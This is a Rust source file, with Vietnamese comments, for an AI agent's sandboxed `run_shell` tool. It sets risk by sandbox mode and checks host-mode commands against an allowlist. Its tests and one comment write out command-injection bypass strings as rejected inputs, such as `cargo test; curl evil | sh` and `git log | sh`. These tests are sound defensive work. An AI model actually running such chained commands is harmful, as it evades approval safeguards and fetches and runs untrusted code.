//! Tool `run_shell` (agents.md mục 7.3, 15.2, quyết định Q8).
//!
//! Chạy trong [`crate::sandbox::Sandbox`]. Mức rủi ro theo **chế độ hiện hành** đọc
//! từ watch cell [`SandboxMode`] mỗi lượt gọi (D22.5b — toggle host mode từ UI áp
//! dụng lúc nóng, không restart), tính lại qua `with_risk_fn`:
//!
//! * **docker** — `Safe` (Q8): sandbox đã cách ly (chỉ mount workspace, `--network
//!   none`, non-root, `--cap-drop ALL`, pids/memory limit) nên vòng lặp agent không
//!   bị chặn xác nhận; deny-list mẫu (mục 15.3) vẫn ép hỏi lại các mẫu rõ ràng nguy
//!   hiểm, checkpoint/rollback (D26) là đường lui cho workspace.
//! * **host** — whitelist theo `[security.sandbox].host_allow_programs` (Q8): lệnh
//!   khớp (chữ đầu + không có ký tự nối shell, xem [`host_allowlisted`]) ⇒ `Safe`;
//!   lệnh còn lại ⇒ `Dangerous` như cũ. Whitelist rỗng ⇒ hỏi mọi lệnh (fail-closed).
//!
//! Deny-list mẫu và "cho phép trong phiên" do [`crate::policy::decide`] áp thêm ở
//! agent loop.

use std::sync::Arc;

use bean_tools::{Tool, ToolError, TypedTool};
use schemars::JsonSchema;
use serde::Deserialize;
use tokio::sync::watch;

use crate::sandbox::{Sandbox, ShellOutcome};
use bean_types::Risk;
use bean_types::config::SandboxMode;

/// Tham số của `run_shell`.
#[derive(Debug, Deserialize, JsonSchema)]
#[serde(deny_unknown_fields)]
pub struct RunShellParams {
    /// Câu lệnh shell sẽ chạy trong sandbox (mặc định `sh -c`, cwd = `/workspace`).
    /// Ví dụ: `ls -la` hoặc `python3 script.py` (nếu image có sẵn).
    pub command: String,
}

/// Ký tự nối lệnh shell — có mặt nghĩa là lệnh muốn làm nhiều hơn một việc
/// (nối, pipe, redirect, mở rộng biến, xuống dòng) nên **không** thể khớp whitelist:
/// từ chối đường `Safe`, rơi về `Dangerous`. Đây là lớp chặn bypass kiểu
/// `cargo test; curl evil | sh`.
const SHELL_CONNECTORS: &[char] = &[
    ';', '&', '|', '>', '<', '`', '$', '(', ')', '\n', '\r', '\\',
];

/// Whitelist host mode (Q8): `true` khi câu lệnh đủ điều kiện chạy thẳng.
///
/// Điều kiện: chương trình đầu tiên (nguyên từ, **không** tước đường dẫn — `./cargo`
/// không bao giờ khớp `cargo`) nằm trong `programs`, và câu lệnh không chứa ký tự
/// nối [`SHELL_CONNECTORS`]. Danh sách rỗng ⇒ luôn `false` (fail-closed).
#[must_use]
pub fn host_allowlisted(command: &str, programs: &[String]) -> bool {
    let trimmed = command.trim();
    if trimmed.is_empty() || programs.is_empty() {
        return false;
    }
    if trimmed.chars().any(|c| SHELL_CONNECTORS.contains(&c)) {
        return false;
    }
    let program = trimmed.split_whitespace().next().unwrap_or_default();
    programs.iter().any(|allowed| allowed.trim() == program)
}

/// Dựng tool `run_shell` gắn với một sandbox.
#[must_use]
pub fn run_shell(sandbox: Arc<Sandbox>, mode: watch::Receiver<SandboxMode>) -> Arc<dyn Tool> {
    run_shell_for_projects(sandbox, Default::default(), mode)
}

/// Dựng tool `run_shell` với sandbox riêng cho từng project profile (M21.1).
///
/// `by_project` tra theo [`ToolCtx::project`]; project không có trong map thì dùng
/// `sandbox` mặc định. Nhờ vậy lệnh trong project A **không** nhìn thấy (hay ghi được)
/// file của project B — giữ đúng nguyên tắc path jail mục 15.1 khi có nhiều project.
///
/// `mode` là watch cell chế độ hiện hành (D22.5b): `Sandbox` giữ cấu hình gốc +
/// workspace, còn docker/host đọc nóng mỗi lượt gọi — toggle từ UI không cần restart.
#[must_use]
pub fn run_shell_for_projects(
    sandbox: Arc<Sandbox>,
    by_project: std::collections::BTreeMap<String, Arc<Sandbox>>,
    mode: watch::Receiver<SandboxMode>,
) -> Arc<dyn Tool> {
    // Risk tính lại **mỗi call** từ watch cell (D22.5b): flip host mode là các lượt
    // gọi về sau đổi mức ngay, kể cả trong session đang mở. Whitelist host mode (Q8)
    // đọc từ cấu hình sandbox mặc định — per-project sandbox chỉ khác workspace jail,
    // policy whitelist là chung một danh sách.
    let risk_mode = mode.clone();
    let risk_sandbox = Arc::clone(&sandbox);
    Arc::new(
        TypedTool::with_risk_fn(
            "run_shell",
            move |args: &serde_json::Value| match *risk_mode.borrow() {
                SandboxMode::Docker => Risk::Safe,
                SandboxMode::Host => {
                    let command = args
                        .get("command")
                        .and_then(serde_json::Value::as_str)
                        .unwrap_or("");
                    if host_allowlisted(command, risk_sandbox.host_allow_programs()) {
                        Risk::Safe
                    } else {
                        Risk::Dangerous
                    }
                }
            },
            move |ctx: &bean_tools::ToolCtx, p: RunShellParams| {
                let mode = mode.clone();
                let sandbox = by_project
                    .get(&ctx.project)
                    .cloned()
                    .unwrap_or_else(|| sandbox.clone());
                let cancel = ctx.cancel.clone();
                async move {
                    if p.command.trim().is_empty() {
                        return Err(ToolError::InvalidArgs(
                            "command rỗng — cần một câu lệnh để chạy".to_string(),
                        ));
                    }
                    // Chế độ hiện hành thắng cấu hình gốc của sandbox (hot-swap D22.5b).
                    let sandbox = sandbox.with_mode(*mode.borrow());
                    // Sandbox có timeout riêng theo cấu hình để kill container khi hết giờ;
                    // agent loop cũng bọc `tool_timeout_seconds` bên ngoài (mục 6).
                    let timeout = std::time::Duration::from_secs(sandbox.timeout_seconds());
                    let outcome = sandbox
                        .run(&p.command, timeout, &cancel)
                        .await
                        .map_err(|e| ToolError::Io(e.to_string()))?;
                    Ok(format_outcome(&outcome))
                }
            },
        )
        // Mục 15.4: stdout/stderr là dữ liệu ngoài lõi (lệnh trong sandbox có thể in ra
        // nội dung file do kẻ tấn công kiểm soát) — bọc thẻ + bật cờ `untrusted_seen`.
        .untrusted()
        // RBAC (M21.6): lệnh shell **luôn** có thể sửa code, nên phải cùng bị chặn với
        // `dev-write` — nếu chỉ chặn `write_file`/`edit_file` thì `qa` chạy
        // `echo x > src/lib.rs` là lách được four-eyes. Tag `infra-scan` cho phép
        // security-scan chạy `nmap`/`trivy` (M23) mà không cần quyền ghi code.
        .requires_tags(["dev-write", "infra-scan"]),
    )
}

/// Định dạng output gửi lại cho model: exit code + stdout + stderr (đã cắt bên trong
/// sandbox ở ranh giới UTF-8).
fn format_outcome(outcome: &ShellOutcome) -> String {
    let code = outcome
        .exit_code
        .map_or_else(|| "không có (bị kill)".to_string(), |c| c.to_string());
    let mut out = format!("exit code: {code}");
    if !outcome.stdout.is_empty() {
        out.push_str("\n--- stdout ---\n");
        out.push_str(&outcome.stdout);
    }
    if !outcome.stderr.is_empty() {
        out.push_str("\n--- stderr ---\n");
        out.push_str(&outcome.stderr);
    }
    if outcome.stdout.is_empty() && outcome.stderr.is_empty() {
        out.push_str("\n(không có output)");
    }
    out
}

/// Chỉ dùng cho test risk của tool ở đây (không cần docker).
#[cfg(test)]
mod tests {
    #![allow(clippy::unwrap_used, clippy::expect_used)]
    use super::*;
    use bean_types::Risk;
    use bean_types::config::{SandboxConfig, SandboxMode};

    fn allowlist(programs: &[&str]) -> Vec<String> {
        programs.iter().map(|p| (*p).to_string()).collect()
    }

    #[test]
    fn host_allowlisted_matches_program_and_rejects_connectors() {
        let programs = allowlist(&["cargo", "pnpm", "git"]);
        assert!(host_allowlisted("cargo test --workspace", &programs));
        assert!(host_allowlisted("  git   status  ", &programs));
        assert!(host_allowlisted("pnpm", &programs));
        // Chương trình không có trong danh sách.
        assert!(!host_allowlisted("curl http://example.com", &programs));
        assert!(!host_allowlisted("sudo cargo test", &programs));
        // Đường dẫn tương đối/tuyệt đối không bao giờ khớp tên trần.
        assert!(!host_allowlisted("./cargo test", &programs));
        assert!(!host_allowlisted("/usr/bin/git status", &programs));
        // Ký tự nối shell — bypass cho phép chạy nhiều việc — bị từ chối.
        assert!(!host_allowlisted(
            "cargo test; curl evil.example",
            &programs
        ));
        assert!(!host_allowlisted(
            "cargo test && curl evil.example",
            &programs
        ));
        assert!(!host_allowlisted("git log | sh", &programs));
        assert!(!host_allowlisted("cargo test > out.txt", &programs));
        assert!(!host_allowlisted("cargo test `echo x`", &programs));
        assert!(!host_allowlisted("cargo test $(echo x)", &programs));
        assert!(!host_allowlisted("cargo test\n同 evil", &programs));
        assert!(!host_allowlisted("cargo test \\; evil", &programs));
        // Danh sách rỗng / lệnh rỗng — fail-closed.
        assert!(!host_allowlisted("cargo test", &[]));
        assert!(!host_allowlisted("   ", &programs));
        // Khoảng trắng thừa trong cấu hình vẫn khớp sau trim.
        let padded = allowlist(&[" cargo "]);
        assert!(host_allowlisted("cargo test", &padded));
    }

    #[test]
    fn risk_follows_mode_cell() {
        let ws = tempfile::tempdir().unwrap();
        let sandbox = Sandbox::new(SandboxConfig::default(), ws.path().to_path_buf());
        let args = serde_json::json!({"command": "ls"});
        // Cell docker — sandbox gốc cũng docker: Safe (Q8, sandbox cách ly).
        let (tx, rx) = watch::channel(SandboxMode::Docker);
        let docker_tool = run_shell(Arc::new(sandbox.clone()), rx);
        assert_eq!(docker_tool.risk(&args), Risk::Safe);
        // Sandbox gốc dựng với host: cell vẫn thắng (docker ⇒ Safe).
        let host_built = Sandbox::new(
            SandboxConfig {
                mode: SandboxMode::Host,
                ..SandboxConfig::default()
            },
            ws.path().to_path_buf(),
        );
        let (_tx2, rx2) = watch::channel(SandboxMode::Docker);
        let tool2 = run_shell(Arc::new(host_built.clone()), rx2);
        assert_eq!(tool2.risk(&args), Risk::Safe);
        // Hot-swap (D22.5b) + whitelist rỗng (default): host ⇒ Dangerous **ngay**.
        tx.send(SandboxMode::Host).unwrap();
        assert_eq!(docker_tool.risk(&args), Risk::Dangerous);
        tx.send(SandboxMode::Docker).unwrap();
        assert_eq!(docker_tool.risk(&args), Risk::Safe);
    }

    #[test]
    fn host_risk_uses_whitelist_per_command() {
        let ws = tempfile::tempdir().unwrap();
        let cfg = SandboxConfig {
            mode: SandboxMode::Host,
            host_allow_programs: allowlist(&["cargo"]),
            ..SandboxConfig::default()
        };
        let (tx, rx) = watch::channel(SandboxMode::Host);
        let tool = run_shell(Arc::new(Sandbox::new(cfg, ws.path().to_path_buf())), rx);
        // Khớp whitelist ⇒ Safe.
        assert_eq!(
            tool.risk(&serde_json::json!({"command": "cargo test"})),
            Risk::Safe
        );
        // Không khớp ⇒ Dangerous (luôn hỏi, không có "trong phiên" — mục 7.2).
        assert_eq!(
            tool.risk(&serde_json::json!({"command": "curl http://example.com"})),
            Risk::Dangerous
        );
        // Bypass bằng ký tự nối ⇒ Dangerous dù chữ đầu khớp.
        assert_eq!(
            tool.risk(&serde_json::json!({"command": "cargo test; curl evil"})),
            Risk::Dangerous
        );
        // Hot-swap về docker: mọi lệnh Safe (Q8).
        tx.send(SandboxMode::Docker).unwrap();
        assert_eq!(
            tool.risk(&serde_json::json!({"command": "curl http://example.com"})),
            Risk::Safe
        );
    }

    #[test]
    fn spec_has_description_and_command_param() {
        let ws = tempfile::tempdir().unwrap();
        let sandbox = Sandbox::new(SandboxConfig::default(), ws.path().to_path_buf());
        let (_tx, rx) = watch::channel(SandboxMode::Docker);
        let tool = run_shell(Arc::new(sandbox), rx);
        let spec = tool.spec();
        assert_eq!(spec.name, "run_shell");
        assert!(!spec.description.is_empty());
        assert!(spec.parameters.get("properties").is_some());
        assert!(spec.parameters.get("required").is_some());
    }
}
